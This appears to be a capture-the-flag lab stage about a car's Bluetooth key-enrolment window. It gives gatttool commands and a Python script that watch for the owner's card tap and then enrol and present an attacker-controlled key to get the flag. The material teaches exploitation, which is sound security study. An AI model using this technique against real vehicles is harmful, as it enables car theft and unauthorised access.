# Enrolling a Key While the Car Is Not Asking (Enrolment)

The goal of this stage is as follows:
*  Tapping a key card is inconvenient twice, so this car stays willing for a short while after the owner presents theirs, rather than asking again before it will drive.
*  The authorisation that window grants is too general. It also covers **enrolling an entirely new key**, with no further authentication and nothing on the display to say a key was added.
*  Anyone in Bluetooth range while the owner uses their card can leave themselves a key.
*  Writing to the enrol characteristic is refused with ATT error `0x08`, Insufficient Authorization, except while that window is open.
*  The window cannot be provoked. The owner comes and goes on their own schedule, and it stays open for a matter of seconds.
*  Enrol a key of your own, then present it.

Task:
*  Walk the attribute table. One characteristic enrols a key, one reports the state, one takes a key you are presenting, and one is the cabin.

```
gatttool -b <address> --char-desc
```

*  Try enrolling now, so you know what a refusal looks like.

```
gatttool -b <address> --char-write-req -a <enrol handle> -n 1122334455667788
```

*  Subscribe to the state characteristic and wait. It says when the card has been presented.
*  While it is open, write your own eight bytes to the enrol characteristic, then write the same bytes to the present characteristic.

```
#!/usr/bin/python3
import sys
sys.path.insert(0, "/challenge")
import ble

client = ble.Client("<address>")
client.subscribe(<state cccd handle>)
for handle, value in client.events_stream(timeout=120):
    if b"card presented" in value:
        client.write(<enrol handle>, b"\x11\x22\x33\x44\x55\x66\x77\x88")
        client.write(<present handle>, b"\x11\x22\x33\x44\x55\x66\x77\x88")
        break
```

*  Read the cabin characteristic.

Present a key the car never should have taken and the cabin gives up the flag!
